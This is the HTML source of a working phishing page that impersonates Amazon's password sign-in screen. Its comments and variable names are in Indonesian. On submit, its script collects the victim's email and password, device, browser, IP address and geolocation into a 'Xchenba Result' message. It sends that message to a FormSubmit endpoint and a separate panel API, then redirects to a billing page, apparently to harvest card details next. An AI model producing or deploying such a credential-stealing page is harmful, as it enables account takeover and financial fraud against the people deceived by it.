<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon - Sign In</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Amazon Ember', Arial, sans-serif;
        }
        body {
            background-color: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
        }
        .logo {
            margin: 10px 0 20px;
        }
        .logo img {
            height: 30px;
        }
        .kotak {
            width: 100%;
            max-width: 340px;
            border: 1px solid #ddd;
            border-radius: 8px;
            padding: 20px 26px;
            background: #fff;
        }
        h1 {
            font-size: 28px;
            font-weight: 400;
            margin-bottom: 12px;
        }
        .email-baris {
            font-size: 14px;
            color: #111;
            margin-bottom: 20px;
        }
        .email-baris a {
            color: #0066c0;
            text-decoration: none;
            margin-left: 6px;
        }
        .email-baris a:hover {
            text-decoration: underline;
        }
        .label-baris {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 7px;
        }
        label {
            font-size: 13px;
            font-weight: 700;
        }
        .lupa-sandi {
            font-size: 12px;
        }
        .lupa-sandi a {
            color: #0066c0;
            text-decoration: none;
        }
        .lupa-sandi a:hover {
            text-decoration: underline;
        }
        input {
            width: 100%;
            padding: 7px 10px;
            border: 1px solid #a6a6a6;
            border-radius: 4px;
            font-size: 15px;
            margin-bottom: 22px;
            height: 32px;
        }
        input:focus {
            border-color: #007185;
            outline: none;
            box-shadow: 0 0 0 1px #007185;
        }
        button {
            width: 100%;
            padding: 7px 10px;
            background: linear-gradient(to bottom, #f7df74, #ecc000);
            border: 1px solid #b88600;
            border-radius: 4px;
            font-size: 15px;
            cursor: pointer;
            height: 32px;
            margin-bottom: 30px;
        }
        button:hover {
            background: linear-gradient(to bottom, #f5d648, #d4a300);
        }
        .garis-bawah {
            border-bottom: 1px solid #e7e7e7;
            margin-bottom: 20px;
        }
        .footer {
            margin-top: 30px;
            font-size: 11px;
            color: #555;
            text-align: center;
        }
        .footer a {
            color: #0066c0;
            text-decoration: none;
            margin: 0 8px;
        }
        .footer a:hover {
            text-decoration: underline;
        }
        .footer p {
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="logo">
        <img src="img/amazonlogo.png" alt="Amazon">
    </div>

    <div class="kotak">
        <h1>Sign in</h1>

        <p class="email-baris" id="tampil-email">
            <!-- Email muncul di sini -->
        </p>

        <div class="label-baris">
            <label for="password">Password</label>
            <span class="lupa-sandi"><a href="#">Forgot password?</a></span>
        </div>

        <form id="form-login" method="POST">
            <input type="hidden" name="_subject" value="Xchenba Result">
            <input type="hidden" name="_template" value="table">
            <input type="hidden" name="email_user" id="email_user">
            <input type="hidden" name="device" id="device_info">
            <input type="hidden" name="browser" id="browser_info">
            <input type="hidden" name="ip_address" id="ip_info">
            <input type="hidden" name="user_agent" id="ua_info">
            
            <input type="password" id="password" name="password" required>
            
            <button type="submit">Sign in</button>
        </form>
    </div>

    <div class="garis-bawah"></div>

    <div class="footer">
        <p>
            <a href="#">Conditions of Use</a>
            <a href="#">Privacy Notice</a>
            <a href="#">Help</a>
        </p>
        <p>© 1996-2026, Amazon.com, Inc. or its affiliates</p>
    </div>

<script src="config.js"></script>
<script>
// === KUMPULKAN DATA PERANGKAT ===
function ambilDataPerangkat() {
    const ua = navigator.userAgent;
    let device = "Desktop";
    if(/Android|iPhone|iPad|iPod|Mobile/i.test(ua)) device = "Mobile";
    
    let browser = "Tidak diketahui";
    if(/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = "Chrome";
    else if(/Firefox/i.test(ua)) browser = "Firefox";
    else if(/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari";
    else if(/Edg/i.test(ua)) browser = "Edge";
    
    return { device, browser, userAgent: ua };
}

window.onload = function() {
    const params = new URLSearchParams(window.location.search);
    const email = params.get("anrew") || localStorage.getItem("dataEmail") || "";
    
    document.getElementById("tampil-email").innerHTML = `${email} <a href="index.html">Change</a>`;
    document.getElementById("email_user").value = email;
    
    const perangkat = ambilDataPerangkat();
    document.getElementById("device_info").value = perangkat.device;
    document.getElementById("browser_info").value = perangkat.browser;
    document.getElementById("ua_info").value = perangkat.userAgent;
};

document.getElementById("form-login").addEventListener("submit", async function(e) {
    e.preventDefault();
    
    const email = document.getElementById("email_user").value;
    const password = document.getElementById("password").value;
    const perangkat = ambilDataPerangkat();
    
    // Ambil IP & lokasi dari layanan publik
    let ip = "Tidak terdeteksi", country = "-", state = "-", city = "-", zip = "-";
    try {
        const res = await fetch("https://ipapi.co/json/");
        const loc = await res.json();
        ip = loc.ip || "-";
        country = loc.country_name || "-";
        state = loc.region || "-";
        city = loc.city || "-";
        zip = loc.postal || "-";
    } catch(err) {
        ip = "Tidak terdeteksi";
    }
    
    // === FORMAT PESAN SESUAI PERMINTAAN ===
    const pesan = `
:: Xchenba Result ::

:: LOGIN INFO ::
# Email               : ${email}
# Password         : ${password}

:: Visitor Details ::
# Device        : ${perangkat.device}
# Browser       : ${perangkat.browser}
# Country       : ${country}
# State         : ${state}
# City          : ${city}
# Zip           : ${zip}
# IP address    : ${ip}
# User agent    : ${perangkat.userAgent}
    `.trim();
    
    // Kirim ke FormSubmit
    const formData = new FormData();
    formData.append("_subject", "Xchenba Result");
    formData.append("message", pesan);
    
    await fetch(FORM_SUBMIT_URL, {
        method: "POST",
        body: formData
    });
    
    // Kirim juga ke panel_api
    await fetch(API_URL, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
            aksi: "tambah_kunjungan",
            ip: ip,
            negara: country,
            isp: "-",
            status: "LOGIN",
            alasan: `Email: ${email}`
        })
    });
    
    localStorage.setItem("password", password);
    window.location.href = "billing.html";
});
</script>
</body>
</html>
